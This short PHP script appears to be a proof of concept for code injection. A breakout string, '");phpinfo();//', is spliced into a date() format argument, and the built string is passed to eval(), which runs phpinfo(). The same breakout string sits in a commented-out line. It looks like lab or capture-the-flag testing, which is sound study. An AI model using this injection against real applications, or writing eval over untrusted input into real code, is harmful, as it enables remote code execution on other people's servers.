<?php 
//$k = "'\");";
//$format = "$k";
$prediction = "+5 day +20 hour +22 minute +21 second";
$payload='$time = date("' . '");phpinfo();//' . '", strtotime("' . $prediction . '"));';
print_r($payload.PHP_EOL);
eval($payload);

print_r($time);
?>